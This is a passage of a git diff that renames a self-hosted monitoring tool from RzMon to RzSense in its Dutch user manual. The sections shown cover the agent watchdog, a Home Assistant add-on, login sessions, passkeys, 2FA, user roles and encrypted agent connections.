-- **Ligt het aan de server zelf?** Kan de agent ook Pushover en ntfy niet bereiken, dan lag het aan zijn eigen netwerk: dan geen bericht. Als RzMon terug is, krijg je daar een ℹ️-melding van (*Systeeminfo → Waakhond*): hoe lang het duurde en of het gemeld is.
-- **RzMon draait, maar de checks staan stil** (de cron loopt niet): RzMon geeft bij elk rapport mee wanneer de checks voor het laatst draaiden; is dat langer geleden dan je ingestelde tijd, dan meldt de waakhond ook dat (*⚠️ RzMon: checks staan stil*), en weer als ze draaien.
+Valt RzSense zelf uit, dan krijg je van RzSense niets meer, en denk je dat alles goed is. Daarom kan een agent **RzSense bewaken**: zet in de **Agent Manager** van een server *🐕 Waakhond* aan (bij 1 of 2 servers is genoeg; elke waakhond stuurt zijn eigen bericht) en kies na hoeveel minuten (standaard 5).
+- Lukt het rapport aan RzSense zo lang niet, dan stuurt de agent **zelf** een pushbericht via Pushover en/of ntfy (*⚠️ RzSense onbereikbaar*, met de prioriteit van je critical-meldingen), en een herstelbericht als RzSense terug is.
+- **Ligt het aan de server zelf?** Kan de agent ook Pushover en ntfy niet bereiken, dan lag het aan zijn eigen netwerk: dan geen bericht. Als RzSense terug is, krijg je daar een ℹ️-melding van (*Systeeminfo → Waakhond*): hoe lang het duurde en of het gemeld is.
+- **RzSense draait, maar de checks staan stil** (de cron loopt niet): RzSense geeft bij elk rapport mee wanneer de checks voor het laatst draaiden; is dat langer geleden dan je ingestelde tijd, dan meldt de waakhond ook dat (*⚠️ RzSense: checks staan stil*), en weer als ze draaien.
 - **Nodig**: Pushover of ntfy aan (*Meldingen → Kanalen*; ntfy vanaf agent 1.72.0) en een **versleutelde verbinding** (koppelcode): de pushgegevens gaan naar de agent, en staan daar in de cache die alleen root kan lezen. Met `WATCHDOG=0` in `/etc/default/rzmon-agent` doet die server nooit mee. Een Pushover-compatibele dienst gebruiken? Zet `PUSHOVER_API` (standaard `https://api.pushover.net/1/messages.json`).
 
-**Tijdens een update van RzMon** (vanaf RzMon 1.205.0 en agent 1.82.0) wachten de agents rustig:
-1. Bij **Bijwerken** (met de knop of automatisch) waarschuwt RzMon eerst de agents: in zijn antwoord op hun rapport staat *update bezig*, met hoe lang ze hooguit wachten. Het update-venster toont dan *Agents waarschuwen (3 van 5)*. De update begint zodra iedereen het weet, of na 75 seconden.
-2. Lukt een rapport tijdens de update niet, dan zet de agent zijn meting in de **wachtrij** en geeft de waakhond **geen alarm**. In `rzmon-agent --status` staat *RzMon-update: wacht op de vrijgave*.
-3. Antwoordt RzMon weer (zonder *update bezig*), dan is dat de **vrijgave**: de agent wacht 0–24 willekeurige seconden (zodat niet alle agents tegelijk komen) en stuurt de wachtrij na. RzMon telt de update niet als *agent stil*.
+**Tijdens een update van RzSense** (vanaf RzSense 1.205.0 en agent 1.82.0) wachten de agents rustig:
+1. Bij **Bijwerken** (met de knop of automatisch) waarschuwt RzSense eerst de agents: in zijn antwoord op hun rapport staat *update bezig*, met hoe lang ze hooguit wachten. Het update-venster toont dan *Agents waarschuwen (3 van 5)*. De update begint zodra iedereen het weet, of na 75 seconden.
+2. Lukt een rapport tijdens de update niet, dan zet de agent zijn meting in de **wachtrij** en geeft de waakhond **geen alarm**. In `rzmon-agent --status` staat *RzSense-update: wacht op de vrijgave*.
+3. Antwoordt RzSense weer (zonder *update bezig*), dan is dat de **vrijgave**: de agent wacht 0–24 willekeurige seconden (zodat niet alle agents tegelijk komen) en stuurt de wachtrij na. RzSense telt de update niet als *agent stil*.
 4. Na afloop staat bij **Meldingen** een ℹ️ **systeeminfo** met de duur, hoeveel agents wachtten en hoeveel metingen ze nastuurden (alleen op de meldingenpagina). Komt een agent niet terug, of mislukt de update, dan gaat de melding ook via je meldkanalen.
-5. **Duurt het te lang** (standaard **5 minuten**, in te stellen bij *Instellingen → RzMon bijwerken*, 5–60), dan geeft de waakhond alsnog alarm: *⚠️ RzMon onbereikbaar tijdens update*. Het herstelbericht komt alleen als je eerst het alarm kreeg.
-- **Veilig:** de agent gelooft *update bezig* alleen uit een **versleuteld antwoord van RzMon zelf**; een foutpagina of proxy kan de waakhond niet stilzetten. Agents zonder versleuteling of ouder dan 1.82.0 doen wat ze altijd deden; het update-venster noemt ze. Een nieuwe agent installeert zich pas na de vrijgave.
+5. **Duurt het te lang** (standaard **5 minuten**, in te stellen bij *Instellingen → RzSense bijwerken*, 5–60), dan geeft de waakhond alsnog alarm: *⚠️ RzSense onbereikbaar tijdens update*. Het herstelbericht komt alleen als je eerst het alarm kreeg.
+- **Veilig:** de agent gelooft *update bezig* alleen uit een **versleuteld antwoord van RzSense zelf**; een foutpagina of proxy kan de waakhond niet stilzetten. Agents zonder versleuteling of ouder dan 1.82.0 doen wat ze altijd deden; het update-venster noemt ze. Een nieuwe agent installeert zich pas na de vrijgave.
 
 ## 9. Agent op Home Assistant OS
 
 Op Home Assistant OS kun je geen scripts of cron op het systeem zelf zetten. De agent draait daarom als **add-on**.
 
 ### Wat wordt er bewaakt?
-| Check in RzMon | Betekenis |
+| Check in RzSense | Betekenis |
 |---|---|
 | CPU / RAM | Van de Home Assistant-host |
 | Diskruimte `/data` | Data-partitie: config, database, back-ups en media |
@@ -3315,12 +3317,12 @@ De add-on haalt back-up, integraties en systeemstatus elke 5 minuten op, de rest
 > Nog niet op een echte Home Assistant getest, alleen met een nagebootste Supervisor. Zie je iets vreemds (bijvoorbeeld een herstart die niet klopt), laat het dan weten.
 
 ### Installeren
-1. **RzMon:** **＋ Server** → naam "Home Assistant", adres = IP van HA, type **Remote met agent**. Kopieer het token via *Agent Manager*, tabblad **🏠 Home Assistant OS**.
+1. **RzSense:** **＋ Server** → naam "Home Assistant", adres = IP van HA, type **Remote met agent**. Kopieer het token via *Agent Manager*, tabblad **🏠 Home Assistant OS**.
 2. **Add-on toevoegen aan Home Assistant.** Kies één van deze manieren:
    - **Via GitHub (aanbevolen):** *Instellingen → Add-ons → Add-on winkel* → ⋮ → **Repositories** → voeg `https://github.com/rembrand20/rzmon` toe. De repository moet openbaar zijn. Updates van de add-on komen dan vanzelf binnen.
    - **Samba share**-add-on: open `\\homeassistant.local\addons` (Windows) of `smb://homeassistant.local/addons` (Mac) en kopieer daar de map **`rzmon_agent`** uit `ha-addon/` naartoe.
    - **Advanced SSH & Web Terminal**-add-on: `scp -r ha-addon/rzmon_agent root@homeassistant.local:/addons/`
-3. **Home Assistant:** *Instellingen → Add-ons → Add-on winkel* → rechtsboven ⋮ → **Controleren op updates**. **RzMon Agent** staat nu onder *RzMon add-ons* (via GitHub) of onder *Lokale add-ons* (via Samba/SSH). Klik op **Installeren**; het bouwen duurt een minuut.
+3. **Home Assistant:** *Instellingen → Add-ons → Add-on winkel* → rechtsboven ⋮ → **Controleren op updates**. **RzSense Agent** staat nu onder *RzSense add-ons* (via GitHub) of onder *Lokale add-ons* (via Samba/SSH). Klik op **Installeren**; het bouwen duurt een minuut.
 4. **Tabblad Configuratie:**
    ```yaml
    monitor_url: http://192.168.1.10
@@ -3331,8 +3333,8 @@ De add-on haalt back-up, integraties en systeemstatus elke 5 minuten op, de rest
      - mijndomein.duckdns.org:443
    ```
    Klik op **Opslaan** en dan op **Starten**. Controleer op het tabblad *Info* dat *Starten bij opstarten* aan staat.
-5. **Logboek:** daar moet `Verbonden met RzMon ✔` staan.
-6. **RzMon:** voeg checks toe met **＋**. Aanbevolen:
+5. **Logboek:** daar moet `Verbonden met RzSense ✔` staan.
+6. **RzSense:** voeg checks toe met **＋**. Aanbevolen:
    - Service `homeassistant`, `supervisor` en `updates`
    - Service `addon:...` voor elke add-on die altijd moet draaien, zoals Mosquitto, Zigbee2MQTT of Z-Wave JS
    - Diskruimte `/data` (80/90%), CPU, RAM
@@ -3340,12 +3342,12 @@ De add-on haalt back-up, integraties en systeemstatus elke 5 minuten op, de rest
    - Bij de server ook een **ping-check** en een **TCP-check op poort 8123**. Die werken los van de agent.
 
 ### Goed om te weten
-- **Waarom een aparte monitor:** valt Home Assistant helemaal uit, dan stopt de agent ook. RzMon merkt dat binnen een paar minuten en stuurt een Pushover-bericht. Dat werkt dus ook als HA zelf geen meldingen meer kan sturen.
+- **Waarom een aparte monitor:** valt Home Assistant helemaal uit, dan stopt de agent ook. RzSense merkt dat binnen een paar minuten en stuurt een Pushover-bericht. Dat werkt dus ook als HA zelf geen meldingen meer kan sturen.
 - **Rechten:** de add-on gebruikt alleen leesfuncties. Hij heeft de Supervisor-rol `manager` (voor statistieken, logs en hardware) en het host-netwerk, en verandert niets aan je installatie.
 - **Ondersteunde hardware:** `aarch64` (Raspberry Pi 4/5, Green, Yellow), `amd64` (NUC, mini-pc, VM) en `armv7`.
 - **Foutmeldingen in het logboek:**
-  - `403` → het token klopt niet, of de server staat in RzMon niet op type *Remote met agent*.
-  - `Could not resolve` / `Failed to connect` → `monitor_url` klopt niet, of RzMon is niet bereikbaar.
+  - `403` → het token klopt niet, of de server staat in RzSense niet op type *Remote met agent*.
+  - `Could not resolve` / `Failed to connect` → `monitor_url` klopt niet, of RzSense is niet bereikbaar.
   - `SSL` / `certificate` → zet `verify_ssl` uit bij een self-signed certificaat.
 - **Nieuwe versie van de add-on uitbrengen:** verhoog `version` in `ha-addon/rzmon_agent/config.yaml` en push naar GitHub. Home Assistant toont dan een update.
 
@@ -3379,7 +3381,7 @@ Zet bij het inloggen **Onthoud mij op dit apparaat** aan. Dan blijf je op dat ap
 - **Rechten:** je houdt de rechten van je account. Wijzigt een beheerder je rol, dan geldt die meteen.
 
 ### Ingelogde apparaten 📱 (vanaf 1.79.0)
-RzMon houdt **elke ingelogde sessie** bij: met wachtwoord, met 2FA, via een onthouden apparaat, en automatisch via je LAN (*lokaal netwerk*). Per sessie zie je:
+RzSense houdt **elke ingelogde sessie** bij: met wachtwoord, met 2FA, via een onthouden apparaat, en automatisch via je LAN (*lokaal netwerk*). Per sessie zie je:
 - het **apparaat** (browser en systeem, bv. *Safari op iPhone*), met *dit apparaat* bij de sessie waar je nu zit;
 - het **IP-adres**, met 🏠 (binnen je vertrouwde netwerken) of 🌍 (van buiten);
 - **hoe** er is ingelogd: 🔑 wachtwoord, 🔐 wachtwoord + 2FA, 📌 onthouden apparaat, 🏠 LAN zonder wachtwoord;
@@ -3388,13 +3390,13 @@ RzMon houdt **elke ingelogde sessie** bij: met wachtwoord, met 2FA, via een onth
 Ook onthouden apparaten zonder actieve sessie staan erin (💤 *onthouden, nu niet actief*): die loggen bij hun volgende bezoek vanzelf in. Een sessie die langer niet gebruikt is dan *Uitloggen na … zonder activiteit* verloopt en verdwijnt uit de lijst.
 
 **⏱️ Uitloggen na … zonder activiteit** (vanaf 1.85.0; *Instellingen → Toegang en inlogbeveiliging*): **30 minuten, 2 uur (standaard), 8 uur of 1 dag**.
-- Zolang RzMon open en zichtbaar is, blijf je ingelogd. De pagina ververst elke 20 seconden en houdt de sessie zo levend.
+- Zolang RzSense open en zichtbaar is, blijf je ingelogd. De pagina ververst elke 20 seconden en houdt de sessie zo levend.
 - Ligt je telefoon in je zak of staat het tabblad op de achtergrond, dan telt de tijd.
 - Met **Onthoud mij op dit apparaat** (30 dagen) log je daarna vanzelf weer in. Van buiten je netwerk gaat dat alleen als het apparaat met 2FA is onthouden. Tip: zet dit op je telefoon aan.
 - Sessies staan sinds 1.85.0 in de database. Daardoor gooit de opruimtaak van het systeem (bij Debian/Ubuntu na 24 minuten) ze niet meer weg.
 
 ### Onzichtbaar van buiten 🕶️ (vanaf 1.86.0)
-*Instellingen → 🔐 Beveiliging → Onzichtbaar van buiten.* Van buiten je eigen netwerk (alles wat niet bij *Toegang → Lokale netwerken* staat) ziet een vreemde niets dat naar RzMon wijst. Thuis verandert er niets.
+*Instellingen → 🔐 Beveiliging → Onzichtbaar van buiten.* Van buiten je eigen netwerk (alles wat niet bij *Toegang → Lokale netwerken* staat) ziet een vreemde niets dat naar RzSense wijst. Thuis verandert er niets.
 
 - **Niet herkenbaar** (standaard aan):
   - `api.php?action=ping` geeft van buiten geen naam en versie meer, behalve aan een server die al als agent bekend is (zijn IP-adres).
@@ -3411,7 +3413,7 @@ Ook onthouden apparaten zonder actieve sessie staan erin (💤 *onthouden, nu ni
   - Wis je de gegevens van je browser, dan is de sleutel weg en doe je het thuis opnieuw.
   - Beheerders zien op de kaart *Onzichtbaar van buiten* alle apparaten en passkeys van iedereen (laatst gezien, IP, land), en kunnen ze hernoemen en intrekken.
 - **⏳ Wachtende apparaten** (vanaf 1.102.0; schakelaar *Geweigerde apparaten bijhouden*, standaard aan): een apparaat van buiten dat nog niet is toegestaan, kun je als beheerder toestaan zonder dat je erbij hoeft te zijn.
-  - Opent een browser uit je **normale landen** RzMon van buiten, dan krijgt hij gewoon de **404**, zoals altijd. Wel krijgt hij een wachtende sleutel mee in een cookie met een neutrale naam, en komt hij op de lijst *Wachtende apparaten* (bij deze kaart), met het soort apparaat, IP-adres, land, hoe vaak en wanneer.
+  - Opent een browser uit je **normale landen** RzSense van buiten, dan krijgt hij gewoon de **404**, zoals altijd. Wel krijgt hij een wachtende sleutel mee in een cookie met een neutrale naam, en komt hij op de lijst *Wachtende apparaten* (bij deze kaart), met het soort apparaat, IP-adres, land, hoe vaak en wanneer.
   - Je krijgt een ℹ️-melding *Geweigerd apparaat van buiten* (standaard alleen op de meldingenpagina; kanalen bij *Instellingen → Meldingen → ℹ️ Systeeminfo*), *Hoe staat het ervoor?* wijst erop en de zijbalk krijgt een oranje bolletje.
   - Per apparaat: **✅ Toestaan** (je kiest de gebruiker en de naam, ziet de gegevens van het IP-adres zoals eigenaar en DNS-naam, en bevestigt met je wachtwoord), **🙈 Negeren** (niet meer tonen, geen meldingen meer) of **⛔ IP blokkeren**.
   - Na *Toestaan* krijgt dat apparaat bij zijn volgende bezoek het inlogscherm, alleen voor die gebruiker, met 2FA als die aan staat. Een ander apparaat vanaf hetzelfde IP blijft een 404 krijgen.
@@ -3419,7 +3421,7 @@ Ook onthouden apparaten zonder actieve sessie staan erin (💤 *onthouden, nu ni
   - Alles komt in het logboek.
 - **🗝️ Passkeys**: bij *Mijn account → Passkey aanmaken* (met je wachtwoord).
   - Daarna log je in met **Inloggen met een passkey**: Face ID, vingerafdruk of pincode, zonder wachtwoord en 2FA-code. Wachtwoord met 2FA blijft de reserve.
-  - De geheime sleutel blijft op je telefoon; RzMon bewaart alleen de openbare sleutel. Een passkey werkt alleen op het echte domein: op een nep-site (`rzrnon.jouwdomein.nl`) biedt je telefoon hem niet eens aan.
+  - De geheime sleutel blijft op je telefoon; RzSense bewaart alleen de openbare sleutel. Een passkey werkt alleen op het echte domein: op een nep-site (`rzrnon.jouwdomein.nl`) biedt je telefoon hem niet eens aan.
   - Werkt alleen via **https met een domeinnaam** (je beheeradres via SWAG, of thuis via een DNS-rewrite naar dat domein), niet via een IP-adres.
   - Een passkey die je maakt op een toegestaan apparaat hoort bij dat apparaat: trek je het apparaat in, dan verdwijnt de passkey ook.
 - **🚪 Noodlink** (sleutel kwijt, nieuwe telefoon, terwijl je onderweg bent):
@@ -3445,10 +3447,10 @@ Bij een wachtwoordwijziging worden alle andere sessies en onthouden apparaten va
 ### Achter een reverse proxy
 Gebruik je **SWAG**, **Nginx Proxy Manager**, **Traefik**, **Caddy**, **Cloudflare Tunnel** of de HA-add-on *NGINX SSL proxy*? Dan komt elk verzoek binnen met het IP van de proxy.
 
-- Vul het IP van de proxy in bij **Reverse proxy IP's**. RzMon gebruikt dan het echte bezoekers-IP uit `X-Forwarded-For`, en ziet via `X-Forwarded-Proto` dat je via https kwam (de sessiecookie krijgt dan `Secure`). Zie ook § 10.2 Beheer via https.
+- Vul het IP van de proxy in bij **Reverse proxy IP's**. RzSense gebruikt dan het echte bezoekers-IP uit `X-Forwarded-For`, en ziet via `X-Forwarded-Proto` dat je via https kwam (de sessiecookie krijgt dan `Secure`). Zie ook § 10.2 Beheer via https.
 - Vergeten? Verzoeken met proxy-kopteksten van een onbekend adres gelden sinds 1.68.0 als **extern** (nooit zonder wachtwoord binnen), met een ⚠️-melding.
 - Zet het proxy-IP **nooit** bij *Lokale netwerken*. Anders komt iedereen die via de proxy binnenkomt, dus ook van internet, zonder wachtwoord binnen.
-- **Testen:** open RzMon via 4G op je telefoon. Je moet een loginscherm krijgen.
+- **Testen:** open RzSense via 4G op je telefoon. Je moet een loginscherm krijgen.
 
 > ⚠️ Sommige routers geven bij port-forwarding álle bezoekers het IP van de router. Test daarom altijd via 4G nadat je deze optie aanzet.
 
@@ -3468,19 +3470,19 @@ Onder *Instellingen → Gebruikers* beheer je wie er mag inloggen, en met welke 
 - Je kunt je eigen rol niet wijzigen, en er blijft altijd minimaal één beheerder.
 - Knoppen die niet mogen, verdwijnen. Rechtsboven zie je *👤 Gebruiker* of *👁 Alleen lezen*.
 - De server controleert de rechten ook zelf, dus ook via de API kan niemand meer dan zijn rol toestaat.
-- **🔐 Bevestigen bij acties** (vanaf 1.206.0, *Instellingen → Beveiliging → Gebruikers*): bij acties als herstellen, installeren, isoleren, blokkeren, bijwerken, terugzetten en verwijderen vraagt RzMon om je wachtwoord. Per rol zet je met een schakelaar aan dat een vinkje **Ik weet het zeker** genoeg is:
+- **🔐 Bevestigen bij acties** (vanaf 1.206.0, *Instellingen → Beveiliging → Gebruikers*): bij acties als herstellen, installeren, isoleren, blokkeren, bijwerken, terugzetten en verwijderen vraagt RzSense om je wachtwoord. Per rol zet je met een schakelaar aan dat een vinkje **Ik weet het zeker** genoeg is:
   - standaard **aan voor beheerders**, uit voor gebruikers (die vullen hun eigen wachtwoord in); *alleen lezen* heeft geen knoppen voor acties;
-  - het vinkje geldt alleen zolang je je wachtwoord **de laatste 60 minuten** hebt ingevuld (bij het inloggen, ook met een passkey, of bij een eerdere bevestiging). Daarna vraagt RzMon het één keer opnieuw. Het aantal minuten stel je zelf in (1–1440);
+  - het vinkje geldt alleen zolang je je wachtwoord **de laatste 60 minuten** hebt ingevuld (bij het inloggen, ook met een passkey, of bij een eerdere bevestiging). Daarna vraagt RzSense het één keer opnieuw. Het aantal minuten stel je zelf in (1–1440);
   - **altijd met je wachtwoord**: passkeys, sleutels, back-ups en certificaten downloaden, het databasewachtwoord en -gegevens, en iedereen uitloggen;
   - op het lokale netwerk (automatisch ingelogd, zonder wachtwoord) vervangt het vinkje het woord dat je typt;
-  - ben je ingelogd met *onthoud mij*, dan vraagt RzMon de eerste keer je wachtwoord, daarna geldt het vinkje.
+  - ben je ingelogd met *onthoud mij*, dan vraagt RzSense de eerste keer je wachtwoord, daarna geldt het vinkje.
 - **👁 Beheerportal voor gebruikers** (vanaf 1.181.0): een gebruiker ziet in *Instellingen* alleen *Overzicht → Status*, *Monitoring → Advies*, *Rapporten* en *Systeem → Wijzigingslogboek*. Bovenaan staat *👁 Alleen bekijken*. Velden staan uit, en knoppen om iets te wijzigen, toe te passen, op te ruimen of terug te draaien zijn weg. Een link naar een ander onderdeel brengt hem naar *Status*. *Alleen lezen* ziet de beheerportal niet.
-- **📋 Functies** (vanaf 1.182.0): op *Instellingen → Overzicht → Functies* staan alle functies van RzMon in één tabel: onderdeel, functie, sinds welke versie en de status van nu (✅ aan, ⚪ uit, ⚠️ niet ingesteld, ✔ altijd). Zoek, filter op onderdeel of status, of klik op een teller. De knop **Instellen** (of **Openen** voor een pagina) brengt je naar de juiste plek. Gebruikers zien de tabel ook, alleen om te bekijken.
+- **📋 Functies** (vanaf 1.182.0): op *Instellingen → Overzicht → Functies* staan alle functies van RzSense in één tabel: onderdeel, functie, sinds welke versie en de status van nu (✅ aan, ⚪ uit, ⚠️ niet ingesteld, ✔ altijd). Zoek, filter op onderdeel of status, of klik op een teller. De knop **Instellen** (of **Openen** voor een pagina) brengt je naar de juiste plek. Gebruikers zien de tabel ook, alleen om te bekijken.
 - **🎨 Weergave voor nieuwe accounts** (vanaf 1.181.0): op *Instellingen → Systeem → Weergave* kies je de standaard voor accounts die bij *Mijn account → Weergave* nog niets kozen. Je kiest de moderne of compacte IDS-weergave, en de beweging in de Attack Flow en het Command center (stil, rustig of vol). Die standaard geldt ook voor het lokale netwerk zonder account.
 
 - **Gebruiker toevoegen:** vul een naam en wachtwoord in. Wil je meteen 2FA, zet dan *Direct tweestapsverificatie instellen* aan. Zonder 2FA is alleen het wachtwoord nodig.
 - **2FA instellen:** klik bij de gebruiker op **🔐 2FA instellen** en scan de QR-code met een authenticator-app, zoals Google of Microsoft Authenticator, Authy, Bitwarden of 1Password. Lukt scannen niet, typ dan de sleutel eronder over. Vul de code in die de app toont: pas daarna staat 2FA aan, dus je kunt jezelf niet per ongeluk buitensluiten.
-- **Inloggen met 2FA:** na het wachtwoord vraagt RzMon om de 6-cijferige code. Een code werkt maar één keer. Na 5 foute codes, of na 5 minuten, begin je opnieuw met je wachtwoord.
+- **Inloggen met 2FA:** na het wachtwoord vraagt RzSense om de 6-cijferige code. Een code werkt maar één keer. Na 5 foute codes, of na 5 minuten, begin je opnieuw met je wachtwoord.
 - **2FA resetten:** bijvoorbeeld bij een nieuwe of verloren telefoon. Klik op **2FA resetten**: die gebruiker logt dan weer in met alleen het wachtwoord, tot 2FA opnieuw is ingesteld.
 - **🔑** stelt een nieuw wachtwoord in voor een gebruiker. **🗑** verwijdert een gebruiker; jezelf en de laatste gebruiker kun je niet verwijderen.
 - **Op het lokale netwerk** blijft inloggen zonder wachtwoord werken als je dat aan hebt staan (als *alleen lezen*, zie hieronder); 2FA geldt voor inloggen met een account.
@@ -3502,7 +3504,7 @@ Wat ervoor nodig is:
 
 Ontbreekt er iets, dan staat dat in rood bij *Gebruikers*. Op het loginscherm verschijnt dan *"Vraag een beheerder"*.
 
-Beveiliging: hooguit 3 links per account per uur en 10 aanvragen per IP-adres per uur. RzMon bewaart alleen een hash van de link. Elke aanvraag staat in het **logboek** (*Gebruikers → Logboek bekijken*), met tijd, IP-adres en wat er gebeurde.
+Beveiliging: hooguit 3 links per account per uur en 10 aanvragen per IP-adres per uur. RzSense bewaart alleen een hash van de link. Elke aanvraag staat in het **logboek** (*Gebruikers → Logboek bekijken*), met tijd, IP-adres en wat er gebeurde.
 
 **Buitengesloten?** Op de server:
 ```bash
@@ -3515,36 +3517,36 @@ sudo -u apache php /var/www/rzmon/install/install.php --reset-2fa admin        #
 ### 10.1 Versleutelde agents, blokkades en beveiligingsmeldingen (vanaf 1.57.0)
 
 **🔐 Beveiligde verbinding** (vanaf 1.64.0, agent 1.50.0; *Instellingen → 🖥️ Agents → Standaardinstellingen*, alleen beheerders)
-- **Eigen sleutel per agent.** Elke agent heeft een eigen sleutel (in `/var/lib/rzmon-agent/agent.key`, alleen root; in de HA-add-on in `/data/rzmon-keys`, op TrueNAS in de map van de agent). Daarmee versleutelt en ondertekent hij alles, en antwoordt RzMon ook versleuteld. Hij stuurt **geen token** meer mee, alleen het kenmerk van zijn sleutel; een verzoek met alleen het token wordt dan geweigerd (⚠️). Wordt één server gehackt, dan geldt dat alleen voor die server: maak een nieuwe koppelcode en de oude sleutel vervalt meteen.
+- **Eigen sleutel per agent.** Elke agent heeft een eigen sleutel (in `/var/lib/rzmon-agent/agent.key`, alleen root; in de HA-add-on in `/data/rzmon-keys`, op TrueNAS in de map van de agent). Daarmee versleutelt en ondertekent hij alles, en antwoordt RzSense ook versleuteld. Hij stuurt **geen token** meer mee, alleen het kenmerk van zijn sleutel; een verzoek met alleen het token wordt dan geweigerd (⚠️). Wordt één server gehackt, dan geldt dat alleen voor die server: maak een nieuwe koppelcode en de oude sleutel vervalt meteen.
 - **Overstap:** een agent die al met de algemene sleutel werkte, krijgt zijn eigen sleutel vanzelf bij zijn volgende rapport (in het versleutelde antwoord). Je hoeft niets te doen; werk alleen de agents bij naar 1.50.0. Een sleutel gaat **nooit leesbaar** over de lijn: een agent zonder sleutel koppel je met een koppelcode.
 - **Koppelcode:** *Agent Manager* → **🔗 Koppelcode maken** (of 🔗 in de tabel). Eenmalig en **15 minuten** geldig. De agent versleutelt zijn eerste bericht met een sleutel uit de code en krijgt zijn eigen sleutel versleuteld terug. Een verlopen of al gebruikte code wordt geweigerd (⚠️). Het venster meldt **✔ Gekoppeld** zodra het gelukt is.
 - **Sleutels vernieuwen:** standaard **elke 30 dagen** (of 7, 90, of alleen met de hand), vanzelf en zonder onderbreking: de agent krijgt de nieuwe in het versleutelde antwoord, de vorige blijft nog 24 uur geldig. Met **🔄** in de tabel vernieuw je hem meteen.
-- **📌 Certificaat van RzMon vastzetten** (standaard aan): draait RzMon met https en een **eigen (self-signed) certificaat**, dan accepteert de agent alleen dát certificaat (`curl --pinnedpubkey`), ook met `INSECURE=1`. RzMon bepaalt de vingerafdruk zelf en geeft hem versleuteld aan de agents; in het installatiecommando staat hij als `--pin`. Bij een **nieuw certificaat** controleert de agent het met zijn sleutel (alleen de echte RzMon kan dan correct antwoorden) en neemt hij de nieuwe vingerafdruk over. Een nep-RzMon met een ander certificaat krijgt niets. Met een geldig certificaat (Let's Encrypt) of via http is vastzetten niet nodig. Uitzetten vraagt om je wachtwoord. Agents hebben curl 7.44 of nieuwer nodig.
-- **🌐 Alleen vanaf het bekende IP-adres** (standaard aan): RzMon onthoudt het eerste IP-adres van elke agent (bij het koppelen: het adres van dat moment). Komt een agent van een **ander adres**, dan weigert RzMon hem, met een ⚠️-melding (ook via Pushover). Bovenaan de kaart staat dan *„… wil verbinden vanaf … en is geweigerd“* met de knop **✔ Toestaan**; daarna komt hij weer binnen (een server mag tot 5 adressen hebben, bv. IPv4 en IPv6). Met **↺** vergeet je de adressen; het volgende wordt het bekende. Uitzetten vraagt om je wachtwoord.
+- **📌 Certificaat van RzSense vastzetten** (standaard aan): draait RzSense met https en een **eigen (self-signed) certificaat**, dan accepteert de agent alleen dát certificaat (`curl --pinnedpubkey`), ook met `INSECURE=1`. RzSense bepaalt de vingerafdruk zelf en geeft hem versleuteld aan de agents; in het installatiecommando staat hij als `--pin`. Bij een **nieuw certificaat** controleert de agent het met zijn sleutel (alleen de echte RzSense kan dan correct antwoorden) en neemt hij de nieuwe vingerafdruk over. Een nep-RzSense met een ander certificaat krijgt niets. Met een geldig certificaat (Let's Encrypt) of via http is vastzetten niet nodig. Uitzetten vraagt om je wachtwoord. Agents hebben curl 7.44 of nieuwer nodig.
+- **🌐 Alleen vanaf het bekende IP-adres** (standaard aan): RzSense onthoudt het eerste IP-adres van elke agent (bij het koppelen: het adres van dat moment). Komt een agent van een **ander adres**, dan weigert RzSense hem, met een ⚠️-melding (ook via Pushover). Bovenaan de kaart staat dan *„… wil verbinden vanaf … en is geweigerd“* met de knop **✔ Toestaan**; daarna komt hij weer binnen (een server mag tot 5 adressen hebben, bv. IPv4 en IPv6). Met **↺** vergeet je de adressen; het volgende wordt het bekende. Uitzetten vraagt om je wachtwoord.
 - **Per server** (vanaf 1.65.0): in de **Agent Manager** en in de tabel op de kaart (kolom 📌 · 🌐) kies je per agent voor vastzetten en het vaste IP-adres: *algemene instelling* (de schakelaars hierboven), *aan* of *uit*. Zo zet je bijvoorbeeld het IP-slot uit voor één server die zijn adres via DHCP krijgt, of zet je het certificaat alleen voor één agent vast. Uitzetten (waar het nu geldt) vraagt om je wachtwoord.
 - **Agents bijwerken** gaat automatisch alleen nog via een **versleutelde** verbinding; een onversleutelde agent werk je bij met de knop. Een agent met een sleutel negeert een antwoord dat niet versleuteld is.
 - *Hoe staat het ervoor?* toont agents zonder eigen sleutel en agents die wachten op toestemming voor een nieuw IP-adres.
 
 **🔐 Algemene sleutel** (agents 1.49.x; op dezelfde kaart onder *Algemene sleutel*)
-- Klik op **🎲 Sleutel genereren**. Agents vanaf **1.49.0** krijgen de sleutel bij hun volgende rapport, en versturen daarna alles **versleuteld**: het rapport, de voortgang van pakketten bijwerken, en het ophalen van hun instellingen. Het antwoord van RzMon komt ook versleuteld terug.
-- **Hoe:** AES-256-CBC met een handtekening (HMAC-SHA256), met `openssl` op de server. RzMon controleert eerst de handtekening en pakt het bericht pas daarna uit. Een bericht ouder dan 5 minuten, of dat al eens binnenkwam (opnieuw afgespeeld), wordt geweigerd. Het antwoord is gebonden aan het verzoek, zodat een oud antwoord niet opnieuw te gebruiken is.
+- Klik op **🎲 Sleutel genereren**. Agents vanaf **1.49.0** krijgen de sleutel bij hun volgende rapport, en versturen daarna alles **versleuteld**: het rapport, de voortgang van pakketten bijwerken, en het ophalen van hun instellingen. Het antwoord van RzSense komt ook versleuteld terug.
+- **Hoe:** AES-256-CBC met een handtekening (HMAC-SHA256), met `openssl` op de server. RzSense controleert eerst de handtekening en pakt het bericht pas daarna uit. Een bericht ouder dan 5 minuten, of dat al eens binnenkwam (opnieuw afgespeeld), wordt geweigerd. Het antwoord is gebonden aan het verzoek, zodat een oud antwoord niet opnieuw te gebruiken is.
 - **Versleutelen:** *Uit*, **Aan** (standaard: wie een sleutel heeft, versleutelt; oude agents werken nog) of *Verplicht* (onversleuteld wordt geweigerd). Per server kies je een eigen instelling in de **Agent Manager** of in de tabel op de kaart: *algemene instelling*, *aan*, *verplicht* of *uit*. Daar zie je ook of het laatste rapport 🔒 versleuteld was.
 - **De sleutel bij de agent:** vanaf 1.64.0 gaat de algemene sleutel alleen nog versleuteld over de lijn. Een agent 1.49.x zonder sleutel geef je hem mee bij het installeren (`--key …`, *Oude manier* in de Agent Manager), of werk hem bij naar 1.50.0 en koppel hem. De agent bewaart hem in `/var/cache/rzmon-agent/enc.key` (alleen root); `ENC_KEY=` in `/etc/default/rzmon-agent` kan ook.
